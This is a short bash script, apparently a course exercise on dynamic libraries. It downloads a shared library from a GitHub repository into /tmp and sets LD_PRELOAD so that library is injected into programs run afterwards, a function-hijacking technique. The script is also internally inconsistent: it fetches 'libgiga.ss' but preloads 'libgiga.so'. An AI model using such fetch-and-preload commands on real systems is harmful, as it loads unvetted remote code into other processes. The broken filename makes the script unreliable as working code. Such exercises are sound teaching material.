#!/bin/bash
wget -P /tmp http://github.com/Outtacosmos-ai/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libgiga.ss
export LD_PRELOAD=/tmp/libgiga.so
